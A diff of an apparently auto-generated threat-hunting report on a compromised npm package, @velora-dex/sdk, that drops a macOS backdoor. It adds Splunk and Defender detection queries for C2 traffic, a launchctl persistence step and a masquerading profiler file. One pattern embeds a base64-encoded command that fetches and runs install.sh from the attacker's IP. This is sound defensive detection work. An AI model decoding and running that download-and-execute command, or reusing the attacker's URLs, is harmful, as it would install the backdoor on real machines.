@@ -22,12 +22,106 @@ On April 7,…
 - **T1071** — Application Layer Protocol
 - **T1195.002** — Compromise Software Supply Chain
 - **T1204.002** — User Execution: Malicious File
+- **T1071.001** — Application Layer Protocol: Web Protocols
+- **T1105** — Ingress Tool Transfer
+- **T1059.004** — Command and Scripting Interpreter: Unix Shell
+- **T1140** — Deobfuscate/Decode Files or Information
+- **T1543.004** — Create or Modify System Process: Launch Daemon
+- **T1036.005** — Masquerading: Match Legitimate Name or Location
 
 ## Kill chain phases observed
 
 _(none detected from narrative keywords)_
 
 ## Recommended hunts
+
+### [LLM] Outbound connection to Velora DEX npm supply-chain C2 89.36.224.5
+
+`UC_303_4` · phase: **c2** · confidence: **High**
+
+**Splunk SPL (CIM):**
+```spl
+| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(All_Traffic.src_ip) as src_ip values(All_Traffic.dest_port) as dest_port values(All_Traffic.app) as app from datamodel=Network_Traffic.All_Traffic where All_Traffic.dest_ip="89.36.224.5" by All_Traffic.dest_ip All_Traffic.src All_Traffic.user host | `drop_dm_object_name(All_Traffic)` | eval ioc_url="http://89.36.224.5/troubleshoot/mac/install.sh", campaign="velora-dex-sdk-9.4.1" | convert ctime(firstTime) ctime(lastTime)
+```
+
+**Defender KQL:**
+```kql
+DeviceNetworkEvents
+| where Timestamp > ago(30d)
+| where RemoteIP == "89.36.224.5"
+   or RemoteUrl has_any ("89.36.224.5/troubleshoot/mac/install.sh","89.36.224.5/mac/arm/driver/profiler","89.36.224.5/mac/intel/driver/profiler")
+| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine,
+          InitiatingProcessParentFileName, RemoteIP, RemotePort, RemoteUrl,
+          InitiatingProcessAccountName
+| order by Timestamp desc
+```
+
+### [LLM] node process spawning bash/curl chain to fetch Velora DEX install.sh dropper
+
+`UC_303_5` · phase: **delivery** · confidence: **High**
+
+**Splunk SPL (CIM):**
+```spl
+| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmdline values(Processes.parent_process) as parent values(Processes.user) as user from datamodel=Endpoint.Processes where (Processes.parent_process_name="node" OR Processes.parent_process="*node*") (Processes.process="*bm9odXAgYmFzaCAtYyAiJChjdXJsIC1mc1NMIGh0dHA6Ly84OS4zNi4yMjQuNS90cm91Ymxlc2hvb3QvbWFjL2luc3RhbGwuc2gpIiA+IC9kZXYvbnVsbCAyPiYx*" OR Processes.process="*89.36.224.5/troubleshoot/mac/install.sh*" OR Processes.process="*base64 --decode*" OR Processes.process="*base64 -D*") by Processes.dest Processes.user Processes.process_name Processes.parent_process_name | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
+```
+
+**Defender KQL:**
+```kql
+DeviceProcessEvents
+| where Timestamp > ago(30d)
+| where InitiatingProcessFileName in~ ("node","node.exe")
+   or InitiatingProcessParentFileName in~ ("node","node.exe")
+| where ProcessCommandLine has_any (
+    "89.36.224.5/troubleshoot/mac/install.sh",
+    "bm9odXAgYmFzaCAtYyAiJChjdXJsIC1mc1NMIGh0dHA6Ly84OS4zNi4yMjQuNS90cm91Ymxlc2hvb3QvbWFjL2luc3RhbGwuc2gpIiA+IC9kZXYvbnVsbCAyPiYx")
+   or (FileName in~ ("bash","sh","zsh") and ProcessCommandLine has "base64" and ProcessCommandLine has "bash")
+| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine,
+          FileName, ProcessCommandLine, AccountName, InitiatingProcessAccountName
+| order by Timestamp desc
+```
+
+### [LLM] launchctl persistence registering zsh.profiler service from non-admin location
+
+`UC_303_6` · phase: **install** · confidence: **High**
+
+**Splunk SPL (CIM):**
+```spl
+| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmdline values(Processes.parent_process_name) as parent values(Processes.user) as user from datamodel=Endpoint.Processes where Processes.process_name="launchctl" (Processes.process="*submit*-l*zsh.profiler*" OR Processes.process="*com.apple.Terminal/profiler*") by Processes.dest Processes.user Processes.process_name Processes.parent_process_name | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
+```
+
+**Defender KQL:**
+```kql
+DeviceProcessEvents
+| where Timestamp > ago(30d)
+| where FileName =~ "launchctl"
+| where ProcessCommandLine has "submit"
+| where ProcessCommandLine has_any ("zsh.profiler","com.apple.Terminal/profiler","Library/Application Support/com.apple.Terminal/profiler")
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName,
+          InitiatingProcessCommandLine, ProcessCommandLine
+| order by Timestamp desc
+```
+
+### [LLM] macOS file write of profiler binary to com.apple.Terminal masquerade path
+
+`UC_303_7` · phase: **install** · confidence: **High**
+
+**Splunk SPL (CIM):**
+```spl
+| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_path) as path values(Filesystem.user) as user values(Filesystem.process_name) as process from datamodel=Endpoint.Filesystem where Filesystem.file_path="*/Library/Application Support/com.apple.Terminal/profiler*" by Filesystem.dest Filesystem.file_name Filesystem.process_name | `drop_dm_object_name(Filesystem)` | convert ctime(firstTime) ctime(lastTime)
+```
+
+**Defender KQL:**
+```kql
+DeviceFileEvents
+| where Timestamp > ago(30d)
+| where ActionType in ("FileCreated","FileRenamed","FileModified")
+| where FolderPath has "Library/Application Support/com.apple.Terminal"
+| where FileName =~ "profiler"
+| project Timestamp, DeviceName, ActionType, FolderPath, FileName, SHA256,
+          InitiatingProcessFileName, InitiatingProcessCommandLine,
+          InitiatingProcessParentFileName, InitiatingProcessAccountName
+| order by Timestamp desc
+```
 
 ### Beaconing — periodic outbound to small set of destinations
 
@@ -90,7 +184,7 @@ DeviceProcessEvents
 
 ### Article-specific behavioural hunt — @velora-dex/sdk Compromised on npm: Malicious Version Drops macOS Backdoor via l
 
-`UC_294_3` · phase: **exploit** · confidence: **High**
+`UC_303_3` · phase: **exploit** · confidence: **High**
 
 **Splunk SPL (CIM):**
 ```spl
@@ -147,4 +241,4 @@ These are standard IOC-substitution hunts — the canonical SPL and KQL live onc
 
 ## Why this matters
 
-Severity classified as **HIGH** based on: IOCs present, 4 use case(s) fired, 5 technique(s) inferred. Read the full article for actor attribution, tooling details, and any defanged IOCs in the body that aren't visible in the RSS summary.
+Severity classified as **HIGH** based on: IOCs present, 8 use case(s) fired, 11 technique(s) inferred. Read the full article for actor attribution, tooling details, and any defanged IOCs in the body that aren't visible in the RSS summary.
